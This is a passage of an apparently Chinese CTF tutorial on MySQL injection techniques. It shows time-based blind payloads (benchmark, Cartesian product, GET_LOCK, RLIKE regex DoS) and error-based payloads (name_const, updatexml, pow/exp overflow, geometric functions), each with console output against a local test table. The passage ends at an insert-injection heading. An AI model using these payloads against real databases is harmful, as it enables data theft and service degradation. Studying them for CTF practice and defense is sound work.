<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h3 data-content="1" id="c4015a95b31a5ac4ad602826e989881c">五种时间盲注姿势</h3>
<ul>
<li><strong>sleep()函数</strong></li>
<li><strong>benchmark函数</strong></li>
</ul>
<pre><code>BENCHMARK(count,expr)</code></pre>
<p><code>benchmark</code>函数会重复计算expr表达式count次，所以我们可以尽可能多的增加计算的次数来增加时间延迟，如下：<br/>
<a href="https://imgchr.com/i/ZZi7GR" target="_blank"><img src="https://s2.ax1x.com/2019/06/25/ZZi7GR.md.png"/></a></p>
<p>可以看到通过重复计算延时了<code>1.90s</code></p>
<ul>
<li><strong>笛卡尔积盲注</strong></li>
</ul>
<p>注入姿势</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="nf">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="n">C</span><span class="p">;</span>
<span class="o">+-----------+</span>
<span class="o">|</span> <span class="nf">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span>  <span class="o">|</span>
<span class="o">+-----------+</span>
<span class="o">|</span> <span class="mi">113101560</span> <span class="o">|</span>
<span class="o">+-----------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">2</span><span class="p">.</span><span class="mi">07</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">SELECT</span> <span class="nf">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="n">C</span><span class="p">);</span>
<span class="o">+------+-----+</span>
<span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span> <span class="o">|</span>
<span class="o">+------+-----+</span>
<span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span> <span class="mi">0</span>   <span class="o">|</span>
<span class="o">+------+-----+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">2</span><span class="p">.</span><span class="mi">08</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">0</span> <span class="k">and</span> <span class="p">(</span><span class="k">SELECT</span> <span class="nf">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="n">C</span><span class="p">);</span>
<span class="n">Empty</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p>利用<code>and短路运算规则</code>进行时间盲注。</p>
<ul>
<li><strong>GET_LOCK盲注</strong></li>
</ul>
<p><code>get_lock</code>函数官方文档中的介绍</p>
<p><a href="https://imgchr.com/i/ZZAQbT" target="_blank"><img src="https://s2.ax1x.com/2019/06/25/ZZAQbT.md.png"/></a></p>
<p>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。</p>
<p>此盲注手法有一些限制，就是必须要同时开两个<code>SESSION</code>进行注入</p>
<p><code>SESSION A</code></p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="nf">get_lock</span><span class="p">(</span><span class="s1">'lihuaiqiu'</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="o">+-------------------------+</span>
<span class="o">|</span> <span class="nf">get_lock</span><span class="p">(</span><span class="s1">'lihuaiqiu'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">|</span>
<span class="o">+-------------------------+</span>
<span class="o">|</span>                       <span class="mi">1</span> <span class="o">|</span>
<span class="o">+-------------------------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><code>SESSION B</code></p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="nf">get_lock</span><span class="p">(</span><span class="s1">'lihuaiqiu'</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
<span class="o">+-------------------------+</span>
<span class="o">|</span> <span class="nf">get_lock</span><span class="p">(</span><span class="s1">'lihuaiqiu'</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="o">|</span>
<span class="o">+-------------------------+</span>
<span class="o">|</span>                       <span class="mi">0</span> <span class="o">|</span>
<span class="o">+-------------------------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">5</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'0'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span>  <span class="nf">get_lock</span><span class="p">(</span><span class="s1">'lihuaiqiu'</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
<span class="n">Empty</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">2</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'0'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">0</span> <span class="k">and</span>  <span class="nf">get_lock</span><span class="p">(</span><span class="s1">'lihuaiqiu'</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
<span class="n">Empty</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p>同样的盲注利用手法。</p>
<ul>
<li><strong>正则<code>DOS</code> RLIKE注入</strong></li>
</ul>
<p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的<code>benchmark</code>注入差不多的。</p>
<p>利用手法</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="nf">mid</span><span class="p">(</span><span class="nf">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'s'</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">))</span> <span class="k">RLIKE</span> <span class="s1">'(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="o">+------+</span>
<span class="o">|</span> <span class="n">flag</span> <span class="o">|</span>
<span class="o">+------+</span>
<span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span>
<span class="o">+------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="nf">mid</span><span class="p">(</span><span class="nf">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'r'</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),</span><span class="nf">rpad</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">))</span> <span class="k">RLIKE</span> <span class="s1">'(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd'</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="n">Empty</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">3</span><span class="p">.</span><span class="mi">83</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<h3 data-content="1" id="1abd71cc79dcbdaf02bf1d66d8d98d23">报错注入</h3>
<p>正常的报错注入网上一搜是一大把的，所以下面讲的是几个比较的姿势。</p>
<ul>
<li><strong>mysql列名重复报错</strong></li>
</ul>
<p>在mysql中，mysql列名重复会导致报错，而我们可以通过<code>name_const</code>制造一个列.</p>
<p>Name_const函数用法</p>
<pre><code>mysql&gt; select name_const(version(),1);
+--------+
| 5.5.47 |
+--------+
|      1 |
+--------+
1 row in set (0.00 sec)</code></pre>
<p>报错用法：</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="nf">name_const</span><span class="p">(</span><span class="nf">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">),</span><span class="nf">name_const</span><span class="p">(</span><span class="nf">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">);;</span>
<span class="o">+--------+--------+</span>
<span class="o">|</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">47</span> <span class="o">|</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">47</span> <span class="o">|</span>
<span class="o">+--------+--------+</span>
<span class="o">|</span>      <span class="mi">1</span> <span class="o">|</span>      <span class="mi">1</span> <span class="o">|</span>
<span class="o">+--------+--------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">ERROR</span><span class="p">:</span>
<span class="n">No</span> <span class="n">query</span> <span class="n">specified</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="nf">name_const</span><span class="p">(</span><span class="nf">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">),</span><span class="nf">name_const</span><span class="p">(</span><span class="nf">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">))</span><span class="n">x</span><span class="p">;</span>
<span class="n">ERROR</span> <span class="mi">1060</span> <span class="p">(</span><span class="mi">42</span><span class="n">S21</span><span class="p">):</span> <span class="n">Duplicate</span> <span class="k">column</span> <span class="n">name</span> <span class="s1">'5.5.47'</span>
</pre></div>
<p>不过这个有很大的限制，<code>version()</code>所多应的值必须是常量，而我们所需要的<code>database()</code>和<code>user()</code>都是变量，无法通过报错得出，但是我们可以利用这个原理配合join函数得到列名。</p>
<p>用法如下：</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="n">a</span> <span class="k">join</span> <span class="n">ctf_test</span> <span class="n">b</span><span class="p">;</span>
<span class="o">+------+--------------+------+--------------+</span>
<span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span>          <span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span>          <span class="o">|</span>
<span class="o">+------+--------------+------+--------------+</span>
<span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span> <span class="mi">0</span>            <span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span> <span class="mi">0</span>            <span class="o">|</span>
<span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span> <span class="mi">0</span>            <span class="o">|</span>
<span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span> <span class="mi">0</span>            <span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span>
<span class="o">+------+--------------+------+--------------+</span>
<span class="mi">4</span> <span class="n">rows</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="n">a</span> <span class="k">join</span> <span class="n">ctf_test</span> <span class="n">b</span> <span class="p">)</span><span class="n">x</span><span class="p">;</span>
<span class="n">ERROR</span> <span class="mi">1060</span> <span class="p">(</span><span class="mi">42</span><span class="n">S21</span><span class="p">):</span> <span class="n">Duplicate</span> <span class="k">column</span> <span class="n">name</span> <span class="s1">'user'</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="n">a</span> <span class="k">join</span> <span class="n">ctf_test</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">user</span><span class="p">))</span><span class="n">x</span><span class="p">;</span>
<span class="n">ERROR</span> <span class="mi">1060</span> <span class="p">(</span><span class="mi">42</span><span class="n">S21</span><span class="p">):</span> <span class="n">Duplicate</span> <span class="k">column</span> <span class="n">name</span> <span class="s1">'pwd'</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="n">a</span> <span class="k">join</span> <span class="n">ctf_test</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">pwd</span><span class="p">))</span><span class="n">x</span><span class="p">;</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span>          <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span> <span class="mi">0</span>            <span class="o">|</span>
<span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="mi">2</span> <span class="n">rows</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<ul>
<li><strong>xpath语法报错与整数溢出报错的区别</strong></li>
</ul>
<p>xpath报错注入中，我们经常用的语法有<code>updatexml</code>和<code>extractvalue</code>函数，同样是报错注入，那么在使用中有什么区别？</p>
<p>例子：<strong>第12届全国大学生信息安全竞赛全宇宙最简单的SQL</strong></p>
<p>如果二者的区别认知不太清楚，很可能导致卡在这个点上</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">'~test~'</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">0</span> <span class="k">and</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">'~test~'</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="nf">pow</span><span class="p">(</span><span class="mi">999</span><span class="p">,</span><span class="mi">999</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1690</span> <span class="p">(</span><span class="mi">22003</span><span class="p">):</span> <span class="kt">DOUBLE</span> <span class="n">value</span> <span class="k">is</span> <span class="k">out</span> <span class="n">of</span> <span class="n">range</span> <span class="k">in</span> <span class="s1">'pow(999,999)'</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">0</span> <span class="k">and</span> <span class="nf">pow</span><span class="p">(</span><span class="mi">999</span><span class="p">,</span><span class="mi">999</span><span class="p">);</span>
<span class="n">Empty</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><strong>从上面的实验中可以得出如果在sql语句中有出现语法错误，则会直接报错，不会被and短路运算所影响，如果是大数溢出报错，则会遵循and短路运算规则</strong>。所以可以利用大数溢出这个问题结合前面的1=0的判断条件进行布尔盲注。</p>
<ul>
<li><strong>整数溢出报错函数</strong></li>
</ul>
<p>pow(),cot(),exp()</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="nf">cot</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1690</span> <span class="p">(</span><span class="mi">22003</span><span class="p">):</span> <span class="kt">DOUBLE</span> <span class="n">value</span> <span class="k">is</span> <span class="k">out</span> <span class="n">of</span> <span class="n">range</span> <span class="k">in</span> <span class="s1">'cot(0)'</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="nf">pow</span><span class="p">(</span><span class="mi">988888</span><span class="p">,</span><span class="mi">999999</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1690</span> <span class="p">(</span><span class="mi">22003</span><span class="p">):</span> <span class="kt">DOUBLE</span> <span class="n">value</span> <span class="k">is</span> <span class="k">out</span> <span class="n">of</span> <span class="n">range</span> <span class="k">in</span> <span class="s1">'pow(988888,999999)'</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="nf">exp</span><span class="p">(</span><span class="mi">710</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1690</span> <span class="p">(</span><span class="mi">22003</span><span class="p">):</span> <span class="kt">DOUBLE</span> <span class="n">value</span> <span class="k">is</span> <span class="k">out</span> <span class="n">of</span> <span class="n">range</span> <span class="k">in</span> <span class="s1">'exp(710)'</span>
</pre></div>
<ul>
<li><strong>利用几何函数进行报错注入</strong></li>
</ul>
<p>几何函数进行报错注入，如<code>polygon()</code>,<code>linestring()</code>函数等，姿势如下：</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="nf">polygon</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1367</span> <span class="p">(</span><span class="mi">22007</span><span class="p">):</span> <span class="n">Illegal</span> <span class="n">non</span> <span class="n">geometric</span> <span class="s1">'`test`.`ctf_test`.`user`'</span> <span class="n">value</span> <span class="n">found</span> <span class="n">during</span> <span class="n">parsing</span>
<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="nf">linestring</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1367</span> <span class="p">(</span><span class="mi">22007</span><span class="p">):</span> <span class="n">Illegal</span> <span class="n">non</span> <span class="n">geometric</span> <span class="s1">'`test`.`ctf_test`.`user`'</span> <span class="n">value</span> <span class="n">found</span> <span class="n">during</span> <span class="n">parsing</span>
</pre></div>
<ul>
<li><strong>对于insert,delete,update三种操作的注入</strong></li>
</ul>
<p>对于select类型操作其实是最常见，最容易上手的，但insert,delete,update三种操作的注入也很重要，下面是总结的这三种注入的操作姿势。</p>
<p><strong>报错注入</strong></p>
<p>insert报错注入</p>
